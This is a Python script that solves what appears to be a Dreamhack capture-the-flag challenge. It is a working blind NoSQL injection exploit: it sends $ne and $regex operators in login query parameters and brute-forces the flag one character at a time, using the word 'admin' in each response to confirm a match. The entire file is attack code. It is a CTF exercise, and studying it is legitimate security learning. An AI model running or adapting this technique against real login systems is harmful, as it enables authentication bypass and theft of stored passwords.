import requests
import string

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

target_url = "http://host8.dreamhack.games:12833/login?uid[$ne]=guest&upw[$regex]=^D[Hh]\\{"
received_flag_content = ""

for i in range(0, 32):
    for char in charset:
        print(f"Test {received_flag_content}{char}")
        res = requests.get(f"{target_url}{received_flag_content}{char}")

        if "admin" in res.text:
            received_flag_content += char
            print(f"[+] Got {received_flag_content}")
            print()
            break

print(f"Final flag content: {received_flag_content}")